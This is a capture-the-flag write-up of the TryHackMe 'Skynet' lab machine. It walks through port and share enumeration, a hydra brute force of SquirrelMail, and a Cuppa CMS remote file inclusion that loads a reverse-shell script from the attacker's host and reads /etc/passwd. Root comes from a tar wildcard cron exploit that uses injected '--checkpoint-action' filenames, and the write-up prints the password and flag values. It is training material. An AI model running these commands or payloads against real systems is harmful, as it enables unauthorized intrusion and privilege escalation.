> TryHackMe - Skynet
> https://tryhackme.com/room/skynet
> Jeff Henschel
> March 22, 2021
--------------------------------------------

![[Screenshot from 2021-03-22 14-36-13.png]]

# Initial Enumeration

## Nmap
* Port 22 SSH open
* Port 80 HTTP running Apache 2.4.18 
* Port 110 POP3 Running Dovecot (E-mail)
* Port 139 Samba
* Port 143 IMAP running Dovecot (E-mail)
* Port 445 Samba 4.3.11
* Hostname is SKYNET
* Ubuntu Linux machine.
```bash
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

---------------------------------------------------------

## Initial Automated HTTP Exploration
### Initial Subdirectory Bruteforce
Using ```gobuster``` a few directories were found.  A majority of them gave the ```STATUS: # 301 Moved Permanently```.   All, but one of them are inaccessible to us upon manual enumeration.
<details>
  <summary>Spoiler:</summary>
	<p>It's found that <u>/squirrelmail</u> proves to be a point of escalation information later on. </p>
</details>

```bash
/index.html           (Status: 200) [Size: 523]
/admin                (Status: 301) [Size: 314] [--> http://10.10.103.180/admin/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.103.180/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.103.180/js/]
/config               (Status: 301) [Size: 315] [--> http://10.10.103.180/config/]
/ai                   (Status: 301) [Size: 311] [--> http://10.10.103.180/ai/]
/squirrelmail         (Status: 301) [Size: 321] [--> http://10.10.103.180/squirrelmail/]
gob.out (END)

```

## Robots.txt
No disallowed directories found.
![[Screenshot from 2021-03-22 14-55-36.png]]

# Initial Manual HTTP Exploration

Greeted with a landing page which appears to have a search function, a static image and not much else.  Upon further inspection it is found that the 'search' function is non-working.  Reading the source of the website reveals nothing of much value, except confirming the search function isn't in production yet.  Reviewing the image known as ```image.png``` it's discovered that the image was created on ```File Modification Date/Time     : 2019:09:17 08:56:09+00:00```.  There was nothing else of real value on ```/index.html```.  

![[Screenshot from 2021-03-22 15-31-53.png]]

using ```wget```, obtained the image and checked for any information using ```strings``` and ```exiftool```.

```bash
┌──(root💀kali)-[~/ctf/thm/skynet]
└─# file image.png 
image.png: PNG image data, 538 x 190, 8-bit/color RGBA, non-interlaced
┌──(root💀kali)-[~/ctf/thm/skynet]
└─# exiftool image.png 
ExifTool Version Number         : 12.16
File Name                       : image.png
Directory                       : .
File Size                       : 24 KiB
File Modification Date/Time     : 2019:09:17 08:56:09+00:00
File Access Date/Time           : 2021:03:22 19:35:10+00:00
File Inode Change Date/Time     : 2021:03:22 19:35:08+00:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 538
Image Height                    : 190
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 538x190
Megapixels                      : 0.102
```


-----------------------------------
## Smb
Using ```enum4linux``` we enumerated the smb shares available on port 445.
```
┌──(root💀kali)-[~/ctf/thm/skynet]
└─# cat enum4linux.txt 
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Mar 22 18:58:39 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.103.180
RID Range ........ 500-550,1000-1050

----snipped----

 ============================== 
|    Users on 10.10.103.180    |
 ============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 

user:[milesdyson] rid:[0x3e8]

 ========================================== 
|    Share Enumeration on 10.10.103.180    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.103.180
//10.10.103.180/print$	Mapping: DENIED, Listing: N/A
//10.10.103.180/anonymous	Mapping: OK, Listing: OK
//10.10.103.180/milesdyson	Mapping: DENIED, Listing: N/A
//10.10.103.180/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

----snipped----

```

## Further SMB enumeration



![[Screenshot from 2021-03-22 15-19-20.png]]


```bash
└─# file log3.txt log2.txt log1.txt
log3.txt: empty
log2.txt: empty
log1.txt: ASCII text
```

```bash
┌──(root💀kali)-[~/ctf/thm/skynet]
└─# file attention.txt 
attention.txt: ASCII text
```
```attention.txt ```appears to be a note regarding all users having to reset passwords.
![[Screenshot from 2021-03-22 15-23-20.png]]

Within ```log1.txt``` we find a list, which appears to be a password list.

![[Screenshot from 2021-03-22 15-22-37.png]]


Checking out ```/squirrelmail```, turned out to be a E-Mail service.  SquirrelMail version 1.4.23  in particular.
```bash
┌──(root💀kali)-[~]
└─# searchsploit squirrelmail 1.4
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SquirrelMail 1.4.2 Address Add Plugin - 'add.php' Cross-Site Scripting                                                                | php/webapps/26305.txt
Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion                                                                              | php/webapps/27948.txt
SquirrelMail 1.4.x - Folder Name Cross-Site Scripting                                                                                 | php/webapps/24068.txt
SquirrelMail < 1.4.22 - Remote Code Execution                                                                                         | linux/remote/41910.sh
SquirrelMail < 1.4.5-RC1 - Arbitrary Variable Overwrite                                                                               | php/webapps/43830.txt
SquirrelMail < 1.4.7 - Arbitrary Variable Overwrite                                                                                   | php/webapps/43839.txt
```

```
curl 'http://10.10.103.180/squirrelmail/src/redirect.php' -H 'User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.10.103.180' -H 'Connection: keep-alive' -H 'Referer: http://10.10.103.180/squirrelmail/src/login.php' -H 'Cookie: squirrelmail_language=en_US; SQMSESSID=06fcbvnbmnr9traq17410783v5' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'login_username=&secretkey=&js_autodetect_results=1&just_logged_in=1'
```

```
hydra -l milesdyson -P log1.txt 10.10.1.235 http-post-form "/squirrelmail/src/redirect.php:login\_username=^USER^&secretkey=^PASS^&js\_autodetect\_results=1&just\_logged\_in=1:Unknown user or password incorrect." -v
```
using hydra we get cyborg007haloterminator as password and get into ```milesdyson``` email inbox.
``` 
)s{A&2Z=F^n_E.B`
```





```bash
smb: \> ls
  .                                   D        0  Tue Sep 17 09:05:47 2019
  ..                                  D        0  Wed Sep 18 03:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 09:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 09:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 09:05:14 2019
  notes                               D        0  Tue Sep 17 09:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 09:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 09:05:14 2019

```
```bash
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
Maybe the ```/45kra24zxs28v3yd``` is a subdir?

miles.jpg
```bash
┌──(root💀kali)-[~/ctf/thm/skynet]
└─# exiftool miles.jpg 
ExifTool Version Number         : 12.16
File Name                       : miles.jpg
Directory                       : .
File Size                       : 23 KiB
File Modification Date/Time     : 2019:09:18 03:29:17+00:00
File Access Date/Time           : 2021:03:23 13:12:56+00:00
File Inode Change Date/Time     : 2021:03:23 13:12:53+00:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Comment                         : File written by Adobe Photoshop� 4.0
Image Width                     : 300
Image Height                    : 356
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 300x356
Megapixels                      : 0.107
```

```
┌──(root💀kali)-[~/ctf/thm/skynet]
└─# gobuster dir -u 10.10.10.103/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt -o gob_expanded.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.103/45kra24zxs28v3yd/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/03/23 13:15:41 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/administrator        (Status: 301) [Size: 337] [--> http://10.10.10.103/45kra24zxs28v3yd/administrator/]
/index.html           (Status: 200) [Size: 418]                                                          
                                                                                                         
===============================================================
2021/03/23 13:17:20 Finished
===============================================================
```

```
┌──(root💀kali)-[~/ctf/thm/skynet]
└─# searchsploit Cuppa
------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                    | php/webapps/25971.txt
------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```
####################################
VULNERABILITY: PHP CODE INJECTION
####################################
```

```
#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

```
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
```


http://10.10.10.103/45kra24zxs28v3yd/administrator/

http://10.10.10.103/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.9.183:8000/php-reverse-shell.php
10.13.9.183:8000/linpeas.sh
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
http://10.10.10.103/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

```
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:113:121::/var/spool/postfix:/bin/false
mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
```


```www-data@skynet:/$ whoami
whoami
www-data
```

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
www-data@skynet:/home/milesdyson$ ls -lh
ls -lh
total 16K
drwxr-xr-x 2 root       root       4.0K Sep 17  2019 backups
drwx------ 3 milesdyson milesdyson 4.0K Sep 17  2019 mail
drwxr-xr-x 3 milesdyson milesdyson 4.0K Sep 17  2019 share
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
www-data@skynet:/home/milesdyson$ cat user.txt	
cat user.txt
7ce5c2109a40f958099283600a9ae807
www-data@skynet:/home/milesdyson$
```


```bash
www-data@skynet:/home/milesdyson/backups$ cat backup.sh	
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```


```bash
www-data@skynet:/dev/shm$ ls -lah
ls -lah
total 320K
drwxrwxrwt  2 root     root       60 Mar 23 08:58 .
drwxr-xr-x 17 root     root     3.6K Mar 23 07:44 ..
-rw-rw-rw-  1 www-data www-data 318K Mar 23 08:36 linpeas.sh

```

```linpeas.sh
old sudo version
cronjob executed by root using tar
```

```
tar wildcard expansion/exploit
```

```
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
```

change /bin/bash to setuid from root

```bash
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```


```
www-data@skynet:/var/www/html$ ls -la
ls -la
total 68
drwxr-xr-x 8 www-data www-data  4096 Nov 26 10:19 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ ls -lah /bin/bash
ls -lah /bin/bash
-rwxr-xr-x 1 root root 1014K Jul 12  2019 /bin/bash
www-data@skynet:/var/www/html$ clear
clear
TERM environment variable not set.
www-data@skynet:/var/www/html$ ls -la /bin/bash
ls -la /bin/bash
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
www-data@skynet:/var/www/html$ date
date
Tue Mar 23 09:24:55 CDT 2021
www-data@skynet:/var/www/html$ printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
<ml$ printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh                     
www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
<ml$ echo "" > "--checkpoint-action=exec=sh shell.sh"                        
www-data@skynet:/var/www/html$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
www-data@skynet:/var/www/html$ ls -la
ls -la
total 80
-rw-rw-rw- 1 www-data www-data     1 Mar 23 09:25 --checkpoint-action=exec=sh shell.sh
-rw-rw-rw- 1 www-data www-data     1 Mar 23 09:25 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Mar 23 09:25 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data    30 Mar 23 09:25 shell.sh
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ date
date
Tue Mar 23 09:26:15 CDT 2021
www-data@skynet:/var/www/html$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
www-data@skynet:/var/www/html$ /bin/bash -p
/bin/bash -p
bash-4.3# whoami
whoami
root
bash-4.3# cd /root/
cd /root/
bash-4.3# ls
ls
root.txt
bash-4.3# cat root.txt
cat root.txt
3f0372db24753accc7179a282cd6a949
bash-4.3# 
```# Questions
What is Miles password for his emails?
```

```

What is the hidden directory?
```
/45kra24zxs28v3yd
```

What is the vulnerability called when you can include a remote file for malicious purposes?
```
```

What is the user flag?
```
```

What is the root flag?
```
```

